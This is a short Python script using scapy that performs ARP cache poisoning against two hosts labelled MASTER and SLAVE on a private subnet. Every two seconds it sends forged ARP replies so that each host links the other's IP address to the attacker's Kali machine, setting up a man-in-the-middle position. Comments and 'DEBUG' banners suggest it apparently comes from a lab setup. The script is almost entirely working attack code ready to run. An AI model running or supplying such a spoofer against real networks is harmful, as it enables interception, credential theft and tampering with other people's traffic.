#!/usr/bin/env python3
from scapy.all import *
import time

MASTER_IP, SLAVE_IP = "172.16.4.50", "172.16.4.51"
INTERFACE = "br0"
KALI_MAC = get_if_hwaddr(INTERFACE)

print(f"🔥 DEBUG MODE - INTERFACE: {INTERFACE}")
print(f"   KALI MAC: {KALI_MAC}\n")

def poison():
    # MASTER <- Kali som SLAVE
    pkt1 = ARP(op=2, psrc=SLAVE_IP, pdst=MASTER_IP, 
               hwdst="9c:2d:cd:bf:3f:3f")  # MASTER MAC
    sendp(pkt1, iface=INTERFACE, verbose=0)
    print(f"💉 Sent: MASTER thinks SLAVE_IP={KALI_MAC}")
    
    # SLAVE <- Kali som MASTER  
    pkt2 = ARP(op=2, psrc=MASTER_IP, pdst=SLAVE_IP,
               hwdst="9c:2d:cd:f2:9c:7a")  # SLAVE MAC
    sendp(pkt2, iface=INTERFACE, verbose=0)
    print(f"💉 Sent: SLAVE thinks MASTER_IP={KALI_MAC}\n")

print("🚀 DEBUG ARP spoofing... Ctrl+C to stop")
try:
    while True:
        poison()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n🛑 Stopped")